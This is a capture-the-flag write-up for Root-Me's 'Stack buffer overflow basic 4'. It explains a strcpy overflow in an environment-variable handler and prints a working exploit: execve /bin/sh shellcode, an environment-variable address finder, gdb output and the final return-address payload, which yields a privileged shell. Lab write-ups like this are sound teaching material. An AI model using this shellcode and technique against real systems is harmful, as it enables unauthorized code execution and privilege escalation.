# ELF x86 - Stack buffer overflow basic 4
https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-basic-4
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 No 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch8@challenge02.root-me.org   
Username	app-systeme-ch8
Password	app-systeme-ch8
```
A quick review of the source code can reveal that there is an overflow vulnerability in the **GetEnv** function, because it uses the _strcpy_ function.
All the 4 variables are vulnerable to overflow. So the most reason choice will be to exploit the _PATH_ variable's overflow (because it's last).<br>

First, the _USERNAME_ is not set. So, let's just put junk into it using the command ```export USERNAME=BBBB```.<br>

No ASLR nor NX, so a simple overflow-with-shellcode will do it.<br>
We need a place to put our shellcode. Because there is no real input function in the program, let's put it in an environment variable. Let's call it **SHELLCODE**.<br>

At the end of the *GetEnv* function, the stack will be formed as the following figure:
```
            +----------------------------+
            |      HOME env variable     |     %ebp - 540
            +----------------------------+
            |    USERNAME env variable   |     %ebp - 412
            +----------------------------+
            |      SHELL env variable    |     %ebp - 284
            +----------------------------+
            |      PATH env variable     |     %ebp - 156
            +----------------------------+
            |           saved ebp        |
            +----------------------------+
            |        return address      |     %ebp + 4
            +----------------------------+
            |   rep movsl dest. address  |     %ebp + 8
            +----------------------------+  
```
The offset to the return address (from _PATH_ is 160 bytes).<br>
**But** in _ebp+8_ there is the ```rep movsl dest. address```. And because we're writing a string to the _PATH_ variable, we may mess up this address with the \x00 character. So, we should overwrite the whole address into a writable address.<br>
So in order to solve this problem, let's create another environment variable (let's call it _JUNK_), and let's initiate it with a big buffer.<br><br>

Now, let's find our variables. Using the following C code (credit to Yandros):
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char * argv[]) {
    char *ptr;
    if(argc<3){
        printf("Usage: %s <environment var> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]);
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;  
    printf("%s will be at %p\n", argv[1], ptr);
}
```
We're able to find both **SHELLCODE** and _JUNK_:
```sh
app-systeme-ch8@challenge02:~$ export SHELLCODE=`python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`
app-systeme-ch8@challenge02:~$ export JUNK=`python -c "print 'B' * 1000"`
app-systeme-ch8@challenge02:~$ /tmp/find_env SHELLCODE ./ch8
SHELLCODE will be at 0xbffff931
app-systeme-ch8@challenge02:~$ /tmp/find_env JUNK ./ch8
JUNK will be at 0xbffffb2b
```

Now it's time to create our payload. But first let's verify our finding:
```gdb
(gdb) set env PATH=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDD
(gdb) run
Starting program: /challenge/app-systeme/ch8/ch8 
[+] Getting env...

Program received signal SIGSEGV, Segmentation fault.
0x00444444 in ?? ()
```
So we can control the _eip_. Now let's replace the 'DDDD' with the **SHELLCODE** address and add the _JUNK_ address to the end of the payload:
```sh
app-systeme-ch8@challenge02:~$ export PATH=`python -c "print 'A'*160 + '\x31\xf9\xff\xbf' + '\x2b\xfb\xff\xbf'"`
app-systeme-ch8@challenge02:~$ ./ch8
$ id
uid=1108(app-systeme-ch8) gid=1108(app-systeme-ch8) euid=1208(app-systeme-ch8-cracked) groups=1208(app-systeme-ch8-cracked),100(users),1108(app-systeme-ch8)
$ cat .passwd
<censored>
```
